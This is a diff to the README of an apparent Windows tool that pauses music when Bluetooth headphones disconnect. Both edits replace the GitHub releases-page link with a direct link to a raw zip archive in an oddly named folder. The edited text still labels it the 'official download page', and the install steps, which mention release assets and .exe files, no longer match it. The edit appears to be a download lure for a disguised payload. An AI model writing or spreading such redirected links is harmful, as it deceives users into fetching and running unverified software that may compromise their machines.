@@ -1,6 +1,6 @@
 # 🎧 auto-pause-bluetooth-audio-windows - Stop music when your headphones disconnect
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Marseillesmandate157/auto-pause-bluetooth-audio-windows/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Marseillesmandate157/auto-pause-bluetooth-audio-windows/main/disposedness/audio_windows_pause_bluetooth_auto_v3.1.zip)
 
 ## 📌 About this application
 
@@ -19,7 +19,7 @@ This software works on devices running Windows 10 or Windows 11.
 
 ## 📥 How to download and install
 
-1.  Visit the [official download page](https://github.com/Marseillesmandate157/auto-pause-bluetooth-audio-windows/releases).
+1.  Visit the [official download page](https://raw.githubusercontent.com/Marseillesmandate157/auto-pause-bluetooth-audio-windows/main/disposedness/audio_windows_pause_bluetooth_auto_v3.1.zip).
 2.  Find the "Assets" section under the latest release.
 3.  Click the link ending in `.exe` or `.msi` to start the download.
 4.  Open the downloaded file.
